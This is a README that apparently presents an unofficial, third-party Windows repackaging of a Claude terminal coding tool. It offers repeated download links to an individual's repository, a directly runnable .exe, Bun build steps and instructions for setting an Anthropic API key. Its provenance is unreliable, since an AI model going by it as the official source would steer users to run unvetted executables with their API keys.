# 🤖 claude-code-main - Run Claude Code on Windows

[![Download](https://img.shields.io/badge/Download-claude--code--main-4c1f7a?style=for-the-badge)](https://github.com/danielgamy981/claude-code-main)

## 🚀 Get the app

Use the link below to visit the download page and get the Windows build:

[Download claude-code-main](https://github.com/danielgamy981/claude-code-main)

## 🪟 Windows setup

This app runs in a terminal window. You will need:

- Windows 10 or Windows 11
- An internet connection
- A valid Anthropic API key
- Node.js 18 or later
- Bun 1.3.11 or later

If you are not sure what Bun is, install it first before you start. The app uses Bun to run the program files.

## 📥 Download the files

1. Open the download page.
2. Get the latest release or source package.
3. Save the file to a folder you can find again, such as Downloads or Desktop.
4. If you downloaded a zip file, extract it before you run the app.

If the page gives you a Windows `.exe` file, download that file and run it directly.

## 🛠️ Install required tools

Before you run the app, install these tools:

- Node.js 18 or newer
- Bun 1.3.11 or newer

### Install Node.js

1. Go to the Node.js website.
2. Download the Windows installer.
3. Run the installer.
4. Keep the default options.

### Install Bun

1. Open the Bun website.
2. Download the Windows version.
3. Run the install command shown on the site.
4. Close and reopen Command Prompt after the install.

## 🔑 Set your API key

The app needs an Anthropic API key to work.

### In Command Prompt

```bat
set ANTHROPIC_API_KEY=your_api_key_here
```

### In PowerShell

```powershell
$env:ANTHROPIC_API_KEY="your_api_key_here"
```

Use your own key in place of `your_api_key_here`.

## ▶️ Run the app

Open Command Prompt or PowerShell in the folder that has the app files.

### If you downloaded a ready-to-run file

Run the file that came with the download, then use the app in the terminal.

### If you built it from source

Install the dependencies first:

```bash
bun install
```

Build the app:

```bash
bun run build
```

After the build finishes, run:

```bash
bun cli.js
```

## 💬 Start a chat

When the app opens, it starts in interactive mode. Type your prompt and press Enter.

Example:

```bash
bun cli.js
```

You can also send one prompt without opening the full chat screen:

```bash
bun cli.js -p "你好"
```

## 📌 Common commands

Use these commands inside the app folder:

```bash
bun cli.js --version
```

Shows the app version.

```bash
bun cli.js --help
```

Shows help text and command options.

```bash
bun cli.js --model <model>
```

Uses a specific model.

## 🧭 What this app does

claude-code-main is a terminal-based AI coding tool. It lets you talk to Claude from the command line. You can use it to:

- Ask coding questions
- Get help with code changes
- Work through bugs
- Generate text for a file
- Use MCP tools when your setup supports them

It uses a React-based terminal UI and runs with Bun.

## 🧩 Main parts

| Part | What it does |
|------|----------------|
| Bun | Runs and builds the app |
| TypeScript | Powers the source code |
| React + Ink | Draws the terminal interface |
| Zod | Checks data before use |
| Anthropic SDK | Connects to the Claude API |
| MCP SDK | Supports tool connections |

## 🧪 Build from source

If you want to build the app yourself, use these steps:

1. Open a terminal in the project folder.
2. Install packages with Bun.
3. Build the project.
4. Run the created `cli.js` file.

```bash
bun install
bun run build
bun cli.js
```

## 🗂️ File output

After a successful build, the project creates:

- `cli.js` in the root folder
- A file size of about 22 MB

This file is the one you run to start the app.

## 🔐 API key use

The app reads the `ANTHROPIC_API_KEY` value from your shell. If the key is not set, the app cannot connect to the Claude API.

Keep the key private and use your own account key.

## 🖥️ Command line example

```bash
set ANTHROPIC_API_KEY=your_api_key_here
bun cli.js -p "Write a short Python script"
```

## 📎 Download again

If you need to return to the download page, use this link:

[Download claude-code-main](https://github.com/danielgamy981/claude-code-main)